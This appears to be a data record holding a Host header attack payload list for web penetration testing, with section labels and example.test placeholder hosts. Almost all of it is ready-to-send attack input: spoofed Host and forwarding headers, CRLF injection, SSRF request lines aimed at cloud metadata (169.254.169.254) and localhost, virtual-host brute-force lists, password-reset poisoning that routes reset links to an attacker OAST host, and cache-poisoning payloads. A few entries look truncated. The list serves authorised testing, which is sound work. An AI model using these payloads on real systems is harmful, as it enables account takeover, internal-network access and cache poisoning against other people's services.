sections.label: Port-based injection (value reflected into a link: https://app.example.test:<injected>/)
Override headers (send alongside the real Host header)
Duplicate Host headers (two Host lines in a proxy; observe which one the application and the front end each use)
Indented or folded Host line (obsolete line folding some servers still tolerate)
Absolute-form request lines (the request line and Host disagree)
Reverse-proxy routing / SSRF through the request line (the proxy may forward to the host in the path)
Connection-state tests (first request validates the host, a later request on the same connection changes it)
Virtual-host fuzzing candidates (Host values to brute-force against the same IP; compare status, size and title)
Password reset poisoning (trigger for your own test account, then inspect the emailed link)
Web cache poisoning through an unkeyed host override (use a cache buster such as ?cb=unique-token)
Dangling-markup and import reflection (look for absolute URLs built from the host)

files.content: # Host Header Attack Payloads # Header and request-line fragments for a proxy. Replace example.test hosts with systems you control. # Direct Host replacement Host: oast.example.test Host: oast.example.test:80 Host: oast.example.test:443 Host: app.example.test.oast.example.test Host: oast.example.test/app.example.test Host: oast.example.test#app.example.test Host: oast.example.test?app.example.test Host: app.example.test@oast.example.test Host: app.example.test:@oast.example.test Host: app.example.test:80@oast.example.test Host: oast.example.test%00.app.example.test Host: oast.example.test%0d%0aX-Injected: host-marker Host: app.example.test:oast.example.test Host: app.example.test:80:80 Host: [::1] Host: 169.254.169.254 Host: internal.example.test Host: admin.example.test Host: staging.example.test # Port-based injection (value reflected into a link: https://app.example.test:/) Host: app.example.test:80">host-port-marker Host: app.example.test:'"> Host: app.example.test:80/../../ # Override headers (send alongside the real Host header) X-Forwarded-Host: oast.example.test X-Forwarded-Server: oast.example.test X-Forwarded-Proto: https X-Forwarded-Port: 1337 X-Forwarded-Scheme: nothttps X-Host: oast.example.test X-HTTP-Host-Override: oast.example.test X-Original-Host: oast.example.test X-Rewrite-Url: /admin Forwarded: host=oast.example.test Forwarded: for=127.0.0.1;host=oast.example.test;proto=https Forwarded: by=127.0.0.1;host=oast.example.test True-Client-IP: 127.0.0.1 X-Cluster-Client-IP: 127.0.0.1 CF-Connecting-IP: 127.0.0.1 Via: 1.1 oast.example.test Referer: https://oast.example.test/ # Duplicate Host headers (two Host lines in a proxy; observe which one the application and the front end each use) GET / HTTP/1.1\r\nHost: app.example.test\r\nHost: oast.example.test\r\n\r\n GET / HTTP/1.1\r\nHost: oast.example.test\r\nHost: app.example.test\r\n\r\n # Indented or folded Host line (obsolete line folding some servers still tolerate) GET / HTTP/1.1\r\nHost: app.example.test\r\n Host: oast.example.test\r\n\r\n # Absolute-form request lines (the request line and Host disagree) GET https://app.example.test/ HTTP/1.1\r\nHost: oast.example.test\r\n\r\n GET https://oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n GET http://oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n GET @oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n GET //oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n # Reverse-proxy routing / SSRF through the request line (the proxy may forward to the host in the path) GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n GET http://127.0.0.1:8080/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n GET http://internal.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n # Connection-state tests (first request validates the host, a later request on the same connection changes it) # Request 1: GET / HTTP/1.1, Host: app.example.test, Connection: keep-alive # Request 2: GET /admin HTTP/1.1, Host: admin.example.test, Connection: keep-alive # Virtual-host fuzzing candidates (Host values to brute-force against the same IP; compare status, size and title) Host: administrator.example.test Host: intranet.example.test Host: stage.example.test Host: dev.example.test Host: test.example.test Host: qa.example.test Host: uat.example.test Host: beta.example.test Host: api.example.test Host: api-internal.example.test Host: backend.example.test Host: console.example.test Host: dashboard.example.test Host: jenkins.example.test Host: grafana.example.test Host: kibana.example.test Host: gitlab.example.test Host: vpn.example.test Host: mail.example.test Host: webmail.example.test Host: old.example.test Host: legacy.example.test Host: preprod.example.test # Password reset poisoning (trigger for your own test account, then inspect the emailed link) POST /password-reset HTTP/1.1\r\nHost: oast.example.test\r\n\r\nemail=tester@example.test POST /password-reset HTTP/1.1\r\nHost: app.example.test\r\nX-Forwarded-Host: oast.example.test\r\n\r\nemail=tester@example.test POST /password-reset HTTP/1.1\r\nHost: app.example.test\r\nX-Forwarded-Host: oast.example.test\r\nX-Forwarded-Proto: https\r\n\r\nemail=tester@example.test # Web cache poisoning through an unkeyed host override (use a cache buster such as ?cb=unique-token) GET /?cb=host-cache-marker HTTP/1.1\r\nHost: app.example.test\r\nX-Forwarded-Host: oast.example.test">\r\n\r\n # Dangling-markup and import reflection (look for absolute URLs built from the host) Host: app.example.test:80'>
